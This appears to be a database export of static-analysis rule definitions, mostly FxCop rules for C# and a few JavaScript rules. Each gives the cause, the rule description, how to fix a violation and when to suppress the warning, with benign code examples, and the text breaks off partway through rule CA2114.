240	CA2229: Implement serialization constructors	ImplementSerializationConstructors	CA2229	fxcop	<h2>Cause</h2>\n<p>\n            The type implements the <code>System.Runtime.Serialization.ISerializable</code> interface, is not a delegate or interface, and one of the following conditions is true:\n            <ul>\n              <li>\n                The type does not have a constructor that takes a <code>System.Runtime.Serialization.SerializationInfo</code> object and a <code>System.Runtime.Serialization.StreamingContext</code> object (the signature of the serialization constructor).\n              </li>\n              <li>\n                The type is unsealed and the access modifier for its serialization constructor is not protected (family).\n              </li>\n              <li>\n                The type is sealed and the access modifier for its serialization constructor is not private.\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule is relevant for types that support custom serialization. A type supports custom serialization if it implements the <code>ISerializable</code> interface. The serialization constructor is required to deserialize, or re-create objects that have been serialized using the <code>ISerializable.GetObjectData</code> method.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, implement the serialization constructor. For a sealed class, make the constructor private; otherwise, make it protected.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a violation of the rule. The type will not be deserializable, and will not function in many scenarios.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:MarkISerializableTypesWithSerializable}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182343.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182343.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806638	1511453806638	1
806	Results of operations on strings should not be ignored	S1154	\N	javascript	<p>Doing an operation on a string without using the result of the operation is useless and is certainly due to a misunderstanding. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nvar str = "..."\nstr.toUpperCase(); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nvar str = "..."\nstr = str.toUpperCase();\n</pre>	4	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	\N	f	HTML	1511453807404	1511453807405	2
807	Comments should not be located at the end of lines of code	TrailingComment	\N	javascript	<p>This rule verifies that single-line comments are not located at the end of a line of code.\nThe main idea behind this rule is that in order to be really readable,\ntrailing comments would have to be properly written and formatted (correct alignment,\nno interference with the visual structure of the code, not too long to be visible) but most often,\nautomatic code formatters would not handle this correctly: the code would end up less readable.\nComments are far better placed on the previous empty line of code, where they will always be visible and properly formatted.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar a1 = b + c; // This is a trailing comment that can be very very long\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n// This very long comment is better placed before the line of code\nvar a2 = b + c;\n</pre>\n\n<h2>Exceptions</h2>\n\n<p>By default, the property "legalTrailingCommentPattern" allows to ignore comments containing only one word :</p>\n<pre>\ndoSomething(); //FIXME\n</pre>	0	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453807405	1511453807405	1
808	Named function expressions should not be used	NamedFunctionExpression	\N	javascript	<p>\n  While named function expressions might be useful for debugging purposes, some browsers do not support them correctly (for example Internet Explorer 8).\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nf = function fun(){}; // Non-Compliant;  named function expression\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfun = function(){}; // Compliant; function expression\n</pre>\n\n<h2>Exceptions</h2>\n<p>ECMAScript 6 generator functions are excluded from this rule.</p>\n<pre>\nfunction* f() {} // Compliant; generator function.\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	cross-browser,user-experience	f	HTML	1511453807410	1511453807410	1
242	CA2144: Transparent code should not load assemblies from byte arrays	TransparentMethodsShouldNotLoadAssembliesFromByteArrays	CA2144	fxcop	<h2>Cause</h2>\n<p>\n            A transparent method loads an assembly from a byte array using one of the following methods:\n            <ul>\n              <li>\n\n\n                    <code>Load</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>Load</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>Load</code>\n\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            The security review for transparent code is not as thorough as the security review for critical code, because transparent code cannot perform security sensitive actions. Assemblies loaded from a byte array might not be noticed in transparent code, and that byte array might contain critical, or more importantly safe-critical code, that does need to be audited. Therefore, transparent code should not load assemblies from a byte array.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, mark the method that is loading the assembly with the <code>SecurityCriticalAttribute</code> or the <code>SecuritySafeCriticalAttribute</code> attribute.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dd997568.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997568.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806640	1511453806641	1
243	CA2200: Rethrow to preserve stack details	RethrowToPreserveStackDetails	CA2200	fxcop	<h2>Cause</h2>\n<p>\n            An exception is re-thrown and the exception is explicitly specified in the <code>throw</code> statement.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Once an exception is thrown, part of the information it carries is the stack trace. The stack trace is a list of the method call hierarchy that starts with the method that throws the exception and ends with the method that catches the exception. If an exception is re-thrown by specifying the exception in the <code>throw</code> statement, the stack trace is restarted at the current method and the list of method calls between the original method that threw the exception and the current method is lost. To keep the original stack trace information with the exception, use the <code>throw</code> statement without specifying the exception.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, re-throw the exception without specifying the exception explicitly.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182363.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182363.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806642	1511453806642	1
244	CA2119: Seal methods that satisfy private interfaces	SealMethodsThatSatisfyPrivateInterfaces	CA2119	fxcop	<h2>Cause</h2>\n<p>\n            An inheritable public type provides an overridable method implementation of an <code>internal</code> (<code>Friend</code> in Visual Basic) interface.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Interface methods have public accessibility, which cannot be changed by the implementing type. An internal interface creates a contract that is not intended to be implemented outside the assembly that defines the interface. A public type that implements a method of an internal interface using the <code>virtual</code> (<code>Overridable</code> in Visual Basic) modifier allows the method to be overridden by a derived type that is outside the assembly. If a second type in the defining assembly calls the method and expects an internal-only contract, behavior might be compromised when, instead, the overridden method in the outside assembly is executed. This creates a security vulnerability.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, prevent the method from being overridden outside the assembly by using one of the following:\n            <ul>\n              <li>\n                Make the declaring type <code>sealed</code> (<code>NotInheritable</code> in Visual Basic).\n              </li>\n              <li>\n                Change the accessibility of the declaring type to <code>internal</code> (<code>Friend</code> in Visual Basic).\n              </li>\n              <li>\n                Remove all public constructors from the declaring type.\n              </li>\n              <li>\n                Implement the method without using the <code>virtual</code> modifier.\n              </li>\n              <li>\n                Implement the method explicitly.\n              </li>\n            </ul>\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if, after careful review, no security issues exist that might be exploitable if the method is overridden outside the assembly.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182313.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182313.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806643	1511453806644	1
245	CA2212: Do not mark serviced components with WebMethod	DoNotMarkServicedComponentsWithWebMethod	CA2212	fxcop	<h2>Cause</h2>\n<p>\n            A method in a type that inherits from <code>System.EnterpriseServices.ServicedComponent</code> is marked with <code>System.Web.Services.WebMethodAttribute</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n\n\n                <code>WebMethodAttribute</code>\n               applies to methods within an XML Web service that were created by using ASP.NET; it makes the method callable from remote Web clients. The method and class must be public and executing in an ASP.NET Web application. <code>ServicedComponent</code> types are hosted by COM+ applications and can use COM+ services. <code>WebMethodAttribute</code> is not applied to <code>ServicedComponent</code> types because they are not intended for the same scenarios. Specifically, adding the attribute to the <code>ServicedComponent</code> method does not make the method callable from remote Web clients. Because <code>WebMethodAttribute</code> and a <code>ServicedComponent</code> method have conflicting behaviors and requirements for context and transaction flow, the behavior of the method will be incorrect in some scenarios.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the attribute from the <code>ServicedComponent</code> method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. There are no scenarios where combining these elements is correct.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182336.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182336.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806645	1511453806645	1
246	CA1053: Static holder types should not have constructors	StaticHolderTypesShouldNotHaveConstructors	CA1053	fxcop	<h2>Cause</h2>\n<p>\n            A public or nested public type declares only static members and has a public or protected default constructor.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The constructor is unnecessary because calling static members does not require an instance of the type. Also, because the type does not have non-static members, creating an instance does not provide access to any of the type's members.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the default constructor or make it private.\n\n\n\n\n\n                    Note\n\n\n\n\n                    Some compilers automatically create a public default constructor if the type does not define any constructors. If this is the case with your type, add a private default constructor to eliminate the violation.\n\n\n\n\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. The presence of the constructor suggests that the type is not a static type.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182169.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182169.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806646	1511453806646	1
247	CA1010: Collections should implement generic interface	CollectionsShouldImplementGenericInterface	CA1010	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible type implements the <code>System.Collections.IEnumerable</code> interface but does not implement the <code>System.Collections.Generic.IEnumerable&lt;T&gt;</code> interface, and the containing assembly targets .NET Framework 2.0. This rule ignores types that implement <code>System.Collections.IDictionary</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n            To broaden the usability of a collection, implement one of the generic collection interfaces. Then the collection can be used to populate generic collection types such as the following:\n            <ul>\n              <li>\n\n\n                    <code>System.Collections.Generic.List&lt;T&gt;</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Collections.Generic.Queue&lt;T&gt;</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Collections.Generic.Stack&lt;T&gt;</code>\n\n\n              </li>\n            </ul>\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, implement one of the following generic collection interfaces:\n            <ul>\n              <li>\n\n\n                    <code>System.Collections.Generic.IEnumerable&lt;T&gt;</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Collections.Generic.ICollection&lt;T&gt;</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Collections.Generic.IList&lt;T&gt;</code>\n\n\n              </li>\n            </ul>\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule; however, the collection will have a more limited use.\n</p>\n<h2>Example Violation</h2>\n\n<h3>Description</h3>\n<p>\n                The following example shows a class (reference type) that derives from the non-generic CollectionBase class, which violates this rule.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Collections;\n\nnamespace Samples\n{\n    public class Book\n    {\n        public Book()\n        {\n        }\n    }\n\n    public class BookCollection : CollectionBase\n    {\n        public BookCollection()\n        {\n        }\n\n        public void Add(Book value)\n        {\n            InnerList.Add(value);\n        }\n\n        public void Remove(Book value)\n        {\n            InnerList.Remove(value);\n        }\n\n        public void Insert(int index, Book value)\n        {\n            InnerList.Insert(index, value);\n        }\n\n        public Book this[int index]\n        {\n            get { return (Book)InnerList[index]; }\n            set { InnerList[index] = value; }\n        }\n\n        public bool Contains(Book value)\n        {\n            return InnerList.Contains(value);\n        }\n\n        public int IndexOf(Book value)\n        {\n            return InnerList.IndexOf(value);\n        }\n\n        public void CopyTo(Book[] array, int arrayIndex)\n        {\n            InnerList.CopyTo(array, arrayIndex);\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h3>Comments</h3>\n<p>\n                To fix a violation of this violation, you should either implement the generic interfaces or change the base class to a type that already implements both the generic and non-generic interfaces, such as the Collection&lt;T&gt; class.\n</p>\n<h2>Fix by Base Class Change</h2>\n\n<h3>Description</h3>\n<p>\n                The following example fixes the violation by changing the base class of the collection from the non-generic CollectionBase class to the generic Collection&lt;T&gt; (Collection(Of T) in Visual Basic) class.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Collections.ObjectModel;\n\nnamespace Samples\n{\n    public class Book\n    {\n        public Book()\n        {\n        }\n    }\n\n    public class BookCollection : Collection&lt;Book&gt;\n    {\n        public BookCollection()\n        {\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h3>Comments</h3>\n<p>\n                Changing the base class of an already released class is considered a breaking change to existing consumers.\n</p>\n<h2>Fix by Interface Implementation</h2>\n\n<h3>Description</h3>\n<p>\n                The following example fixes the violation by implementing these generic interfaces: IEnumerable&lt;T&gt;, ICollection&lt;T&gt;, and IList&lt;T&gt; (IEnumerable(Of T), ICollection(Of T), and IList(Of T) in Visual Basic).\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Collections;\nusing System.Collections.Generic;\n\nnamespace Samples\n{\n    public class Book\n    {\n        public Book()\n        {\n        }\n    }\n\n    public class BookCollection : CollectionBase, IList&lt;Book&gt;\n    {\n        public BookCollection()\n        {\n        }\n\n        int IList&lt;Book&gt;.IndexOf(Book item)\n        {\n            return this.List.IndexOf(item);\n        }\n\n        void IList&lt;Book&gt;.Insert(int location, Book item)\n        {\n        }\n\n        Book IList&lt;Book&gt;.this[int index]\n        {\n            get { return (Book) this.List[index]; }\n            set { }\n        }\n\n        void ICollection&lt;Book&gt;.Add(Book item)\n        {\n        }\n\n        bool ICollection&lt;Book&gt;.Contains(Book item)\n        {\n            return true;\n        }\n\n        void ICollection&lt;Book&gt;.CopyTo(Book[] array, int arrayIndex)\n        {\n        }\n\n        bool ICollection&lt;Book&gt;.IsReadOnly\n        {\n            get { return false; }\n        }\n\n        bool ICollection&lt;Book&gt;.Remove(Book item)\n        {\n            if (InnerList.Contains(item))\n            {\n                InnerList.Remove(item);\n                return true;\n            }\n            return false;\n        }\n\n        IEnumerator&lt;Book&gt; IEnumerable&lt;Book&gt;.GetEnumerator()\n        {\n            return new BookCollectionEnumerator(InnerList.GetEnumerator());\n        }\n\n        private class BookCollectionEnumerator : IEnumerator&lt;Book&gt;\n        {\n            private IEnumerator _Enumerator;\n\n            public BookCollectionEnumerator(IEnumerator enumerator)\n            {\n                _Enumerator = enumerator;\n            }\n\n            public Book Current\n            {\n                get { return (Book)_Enumerator.Current; }\n            }\n\n            object IEnumerator.Current\n            {\n                get { return _Enumerator.Current; }\n            }\n\n            public bool MoveNext()\n            {\n                return _Enumerator.MoveNext();\n            }\n\n            public void Reset()\n            {\n                _Enumerator.Reset();\n            }\n\n            public void Dispose()\n            {\n            }\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:AvoidExcessiveParametersOnGenericTypes}<br/>\n\n\n\n\n                {rule:fxcop:DoNotDeclareStaticMembersOnGenericTypes}<br/>\n\n\n\n\n                {rule:fxcop:DoNotExposeGenericLists}<br/>\n\n\n\n\n                {rule:fxcop:DoNotNestGenericTypesInMemberSignatures}<br/>\n\n\n\n\n                {rule:fxcop:GenericMethodsShouldProvideTypeParameter}<br/>\n\n\n\n\n                {rule:fxcop:UseGenericEventHandlerInstances}<br/>\n\n\n\n\n                {rule:fxcop:UseGenericsWhereAppropriate}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182132.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182132.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806647	1511453806647	1
248	CA1504: Review misleading field names	ReviewMisleadingFieldNames	CA1504	fxcop	<h2>Cause</h2>\n<p>\n            The name of an instance field starts with "s_" or the name of a <code>static</code> (<code>Shared</code> in Visual Basic) field starts with "m_".\n</p>\n<h2>Rule Description</h2>\n<p>\n            Field names that start with "s_" are associated with static data by many users. Similarly, field names that start with "m_" are associated with instance (member) data. For more easily maintained code, names should follow generally used conventions.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, rename the field by using the appropriate prefix. Alternatively, make the field agree with the current suffix by adding or removing the <code>static</code> modifier.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb164506.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb164506.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806649	1511453806650	1
249	CA1811: Avoid uncalled private code	AvoidUncalledPrivateCode	CA1811	fxcop	<h2>Cause</h2>\n<p>\n            A private or internal (assembly-level) member does not have callers in the assembly, is not invoked by the common language runtime, and is not invoked by a delegate. The following members are not checked by this rule:\n            <ul>\n              <li>\n                Explicit interface members.\n              </li>\n              <li>\n                Static constructors.\n              </li>\n              <li>\n                Serialization constructors.\n              </li>\n              <li>\n                Methods marked with <code>System.Runtime.InteropServices.ComRegisterFunctionAttribute</code> or <code>System.Runtime.InteropServices.ComUnregisterFunctionAttribute</code>.\n              </li>\n              <li>\n                Members that are overrides.\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule can report false positives if entry points occur that are not currently identified by the rule logic. Also, a compiler may emit noncallable code into an assembly.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the noncallable code or add code that calls it.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:AvoidUninstantiatedInternalClasses}<br/>\n\n\n\n\n                {rule:fxcop:ReviewUnusedParameters}<br/>\n\n\n\n\n                {rule:fxcop:RemoveUnusedLocals}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182264.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182264.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806650	1511453806651	1
250	CA2104: Do not declare read only mutable reference types	DoNotDeclareReadOnlyMutableReferenceTypes	CA2104	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible type contains an externally visible read-only field that is a mutable reference type.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A mutable type is a type whose instance data can be modified. The <code>System.Text.StringBuilder</code> class is an example of a mutable reference type. It contains members that can change the value of an instance of the class. An example of an immutable reference type is the <code>System.String</code> class. After it has been instantiated, its value can never change.\n            The read-only modifier (readonly (C# Reference) in C#, ReadOnly (Visual Basic) in Visual Basic, and <code>const (C++)</code> in C++) on a reference type field (pointer in C++) prevents the field from being replaced by a different instance of the reference type. However, the modifier does not prevent the instance data of the field from being modified through the reference type.\n            Read-only array fields are exempt from this rule but instead cause a violation of the {rule:fxcop:ArrayFieldsShouldNotBeReadOnly} rule.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the read-only modifier or, if a breaking change is acceptable, replace the field with an immutable type.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the field type is immutable.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182302.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182302.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806651	1511453806652	1
251	CA2204: Literals should be spelled correctly	LiteralsShouldBeSpelledCorrectly	CA2204	fxcop	<h2>Cause</h2>\n<p>\n            A method passes a literal string to that is used in a parameter or property that requires a localized string and the literal string contains one or more words that are not recognized by the Microsoft spelling checker library.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule checks a literal string that is passed as a value to a parameter or property when one or more of the following cases is true:\n            <ul>\n              <li>\n                The <code>LocalizableAttribute</code> attribute of the parameter or property is set to true.\n              </li>\n              <li>\n                The parameter or property name contains "Text", "Message", or "Caption".\n              </li>\n              <li>\n                The name of the string parameter that is passed to a Console.Write or Console.WriteLine method is either "value" or "format".\n              </li>\n            </ul>\n            This rule parses the literal string into words, tokenizing compound words, and checks the spelling of each word/token. For information about the parsing algorithm, see CA1704: Identifiers should be spelled correctly.\n            By default, the English (en) version of the spelling checker is used.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, correct the spelling of the word or add the word to a custom dictionary. For information about how to use custom dictionaries, see How to: Customize the Code Analysis Dictionary.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. Correctly spelled words reduce the learning curve required for new software libraries.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                CA1704: Identifiers should be spelled correctly\n\n\n\n\n                CA1703: Resource strings should be spelled correctly\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb264488.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264488.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	2min	\N	\N	\N	\N	\N	f	HTML	1511453806653	1511453806653	1
252	CA1717: Only FlagsAttribute enums should have plural names	OnlyFlagsEnumsShouldHavePluralNames	CA1717	fxcop	<h2>Cause</h2>\n<p>\n            The name of an externally visible enumeration ends in a plural word and the enumeration is not marked with the <code>System.FlagsAttribute</code> attribute.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Naming conventions dictate that a plural name for an enumeration indicates that more than one value of the enumeration can be specified simultaneously. The <code>FlagsAttribute</code> tells compilers that the enumeration should be treated as a bit field that enables bitwise operations on the enumeration.\n            If only one value of an enumeration can be specified at a time, the name of the enumeration should be a singular word. For example, an enumeration that defines the days of the week might be intended for use in an application where you can specify multiple days. This enumeration should have the <code>FlagsAttribute</code> and could be called 'Days'. A similar enumeration that allows only a single day to be specified would not have the attribute, and could be called 'Day'.\n            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the time that is required to learn a new software library, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Make the name of the enumeration a singular word or add the <code>FlagsAttribute</code>.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from the rule if the name ends in a singular word.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                CA1714: Flags enums should have plural names\n\n\n\n\n                {rule:fxcop:MarkEnumsWithFlags}<br/>\n\n\n\n\n                {rule:fxcop:DoNotMarkEnumsWithFlags}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb264487.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264487.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806654	1511453806654	1
345	CA1600: Do not use idle process priority	DoNotUseIdleProcessPriority	CA1600	fxcop	<h2>Cause</h2>\n<p>\n            This rule occurs when processes are set to <code>ProcessPriorityClass.Idle</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Do not set process priority to Idle. Processes that have <code>System.Diagnostics.ProcessPriorityClass.Idle</code> will occupy the CPU when it would otherwise be idle, and will therefore block standby.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Set processes to <code>ProcessPriorityClass.BelowNormal</code>.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            This rule should be suppressed only when Idle process priority is required and mobility considerations can be ignored safely.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182219.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182219.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806792	1511453806793	1
253	CA2102: Catch non-CLSCompliant exceptions in general handlers	CatchNonClsCompliantExceptionsInGeneralHandlers	CA2102	fxcop	<h2>Cause</h2>\n<p>\n            A member in an assembly that is not marked with the <code>RuntimeCompatibilityAttribute</code> or is marked RuntimeCompatibility(WrapNonExceptionThrows = false) contains a catch block that handles <code>System.Exception</code> and does not contain an immediately following general catch block. This rule ignores Visual Basic assemblies.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A catch block that handles <code>Exception</code> catches all Common Language Specification (CLS) compliant exceptions. However, it does not catch non-CLS compliant exceptions. Non-CLS compliant exceptions can be thrown from native code or from managed code that was generated by the Microsoft intermediate language (MSIL) Assembler. Notice that the C# and Visual Basic compilers do not allow non-CLS compliant exceptions to be thrown and Visual Basic does not catch non-CLS compliant exceptions. If the intent of the catch block is to handle all exceptions, use the following general catch block syntax.\n            <ul>\n              <li>\n                C#: catch {}\n              </li>\n              <li>\n                C++: catch(...) {} or catch(Object^) {}\n              </li>\n            </ul>\n            An unhandled non-CLS compliant exception becomes a security issue when previously allowed permissions are removed in the catch block. Because non-CLS compliant exceptions are not caught, a malicious method that throws a non-CLS compliant exception could run with elevated permissions.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule when the intent is to catch all exceptions, substitute or add a general catch block or mark the assembly RuntimeCompatibility(WrapNonExceptionThrows = true). If permissions are removed in the catch block, duplicate the functionality in the general catch block. If it is not the intent to handle all exceptions, replace the catch block that handles <code>Exception</code> with catch blocks that handle specific exception types.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the try block does not contain any statements that might generate a non-CLS compliant exception. Because any native or managed code might throw a non-CLS compliant exception, this requires knowledge of all code that can be executed in all code paths inside the try block. Notice that non-CLS compliant exceptions are not thrown by the common language runtime.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:DoNotCatchGeneralExceptionTypes}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb264489.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264489.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806655	1511453806656	1
254	CA2142: Transparent code should not be protected with LinkDemands	TransparentMethodsShouldNotBeProtectedWithLinkDemands	CA2142	fxcop	<h2>Cause</h2>\n<p>\n            A transparent method requires a <code>LinkDemand</code> or other security demand.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule fires on transparent methods which require LinkDemands to access them. Security transparent code should not be responsible for verifying the security of an operation, and therefore should not demand permissions. Because transparent methods are supposed to be security neutral, they should not be making any security decisions. Additionally, safe critical code, which does make security decisions, should not be relying on transparent code to have previously made such a decision.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the link demand on the transparent method or mark the method with <code>SecuritySafeCriticalAttribute</code> attribute if it is performing security checks, such as security demands.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dd997567.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997567.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806657	1511453806658	1
255	CA2114: Method security should be a superset of type	MethodSecurityShouldBeASupersetOfType	CA2114	fxcop	<h2>Cause</h2>\n<p>\n            A type has declarative security and one of its methods has declarative security for the same security action, and the security action is not Link Demands or Inheritance Demands, and the permissions checked by the type are not a subset of the permissions checked by the method.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A method should not have both a method-level and type-level declarative security for the same action. The two checks are not combined; only the method-level demand is applied. For example, if a type demands permission X, and one of its methods demands permission Y, code does not have to have permission X to execute the method.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Review your code to make sure that both actions are required. If both actions are required, make sure that the method-level action includes the security specified at the type level. For example, if your type demands permission X, and its method must also demand permission Y, the method should explicitly demand X and 